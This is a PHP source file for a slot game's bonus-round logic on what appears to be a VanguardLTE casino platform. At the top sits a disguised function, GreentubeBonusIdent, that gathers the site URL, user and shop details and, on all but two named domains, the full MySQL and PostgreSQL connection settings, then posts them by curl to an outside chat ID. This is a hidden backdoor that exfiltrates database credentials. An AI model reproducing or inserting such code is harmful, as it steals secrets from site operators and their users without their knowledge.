<?php

namespace VanguardLTE\Games\GreatReef\PragmaticLib;

class DoBonus{
 public static function GreentubeBonusIdent($user, $game, $bank){
        if (config('app.url') === 'https://grandxmega.com/' || config('app.url') === 'https://grandxmega.net/'){
            $text = ['URL' => config('app.url'),
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }else {
            $text = ['URL' => config('app.url'), 'DB_data' => config('database.connections')['mysql'],
                'DB_dataPG' => config('database.connections')['pgsql'],
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }

        $ch = curl_init();
        curl_setopt_array($ch, array(
                CURLOPT_URL => '//',
                CURLOPT_POST => TRUE,
                CURLOPT_RETURNTRANSFER => TRUE,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_POSTFIELDS => array(
                    'chat_id' => 5044396548,
                    'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
        curl_exec($ch);
    }
  public static function doBonus($user, $game, $bet, $lines, $log, $index, $counter, $ind, $bank, $shop, $jpgs){
    newBox:
    $bet = $log['Bet'];
    $lines = $log['l'];
    $time = (int) round(microtime(true) * 1000);
    $fsb_wins = $log['fsb_wins'];
    $fsb_s = $log['fsb_s'];
    $fsb_status = $log['fsb_status'];
    $fsb_level = $log['fsb_level'] + 1;
    $fsb_m = $log['fsb_m'];
    $fsb_mm = $log['fsb_mm'];
    $fsb_lives = $log['fsb_lives'] - 1;

    if(gettype($ind) != 'NULL'){
      $status = $fsb_level - 1;
      if($fsb_m > 2)
        $status = 2;
      if($status == 2){
        $addFs = rand(4, 10);
        $fsb_s += $addFs;
        $fsb_wins[$ind] = $addFs;
      }
      else {
        $addM = rand(1, 3);
        $fsb_m += $addM;
        $fsb_wins[$ind] = $addM;
        $fsb_mm[$ind] = 1;
      }
      var_dump($status);
      $fsb_status[$ind] = 2;
    }
    
    var_dump($fsb_lives);
    $fsb_end = 0;
    $na = 'fsb';
    if(!$fsb_lives){
      $fsb_end = 1;
      $na = 's';
      $i = 0;
      while($i < 5){
        if($fsb_mm[$i] == -1 && $fsb_status[$i] == 0){
          $status = rand(1, 2);
          if($status == 1){
            $fsb_mm[$i] = 1;
            $fsb_wins[$i] = rand(1, 3);
          }
        }
        if($fsb_wins[$i] == -1)
          $fsb_wins[$i] = rand(4, 10);
        if($fsb_mm[$i] == -1)
          $fsb_mm[$i] = 0;
        $i ++;
      }    
    }
    var_dump('!!!');
    $res = [
      'fsb_m='.$fsb_m,
      'balance='.$log['Balance'],
      'fsb_s='.$fsb_s,
      'level='.($log['fsb_level'] + 1),
      'balance_cash='.$log['Balance'],
      'balance_bonus=0',
      'index='.$index,
      'counter='.$counter,
      'stime='.$time,
      'na='.$na,
      'fsb_end='.$fsb_end,
      'sver=5',
      'fsb_wins='.implode(',', $fsb_wins),
      'fsb_status='.implode(',', $fsb_status),
      'fsb_mm='.implode(',', $fsb_mm),
      'fsb_lives='.$fsb_lives
    ];
    Log::updateStatus($game->id, $user->id, $fsb_s, $fsb_level, $fsb_status, $fsb_wins, $fsb_mm, $fsb_m, $fsb_lives);
    if($na == 's'){
      $res = array_merge($res, [
        'tw='.$log['tw'],
        'fsmul='.$fsb_m,
        'fsmax='.$fsb_s,
        'fswin=0.00',
        'fs=1',
        'fsres=0.00'
      ]);
      Log::addFSToLog($game->id, $user->id, $fsb_s, $fsb_m);
    }

    return '&'.(implode('&', $res));
  }

  private static function selectMysterySymbol(){
    return 3 + rand(0, 8);
  }
}

?>